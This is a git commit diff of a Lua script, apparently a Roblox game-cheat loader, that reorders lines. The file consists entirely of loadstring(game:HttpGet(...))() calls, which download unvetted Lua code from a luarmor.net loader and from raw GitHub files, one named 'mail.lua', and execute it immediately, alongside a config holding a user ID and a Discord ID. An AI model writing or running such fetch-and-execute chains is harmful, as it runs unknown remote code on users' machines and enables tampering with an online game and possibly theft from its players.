281ee7335c9f6f77c360c4556350ad609c875d2b
Grogutech <110765236+Grogutech@users.noreply.github.com>
2024-11-17 08:38:39 +0300

    Update go3.lua

--- go3.lua
+++ go3.lua
@@ -1,4 +1,6 @@
+
+
+loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/957ebb42504c2c23a15c8e78a4758f38.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Grogutech/beb/refs/heads/main/mail.lua"))()
 _G.Config = { UserID = "752adf06-faf4-40f9-8f22-9c9bca3aa5e3", discord_id = "314107374715535370" , Note = "Pc", } 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/skadidau/unfazedfree/refs/heads/main/petsgo"))()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Grogutech/beb/refs/heads/main/mail.lua"))()
-loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/957ebb42504c2c23a15c8e78a4758f38.lua"))()
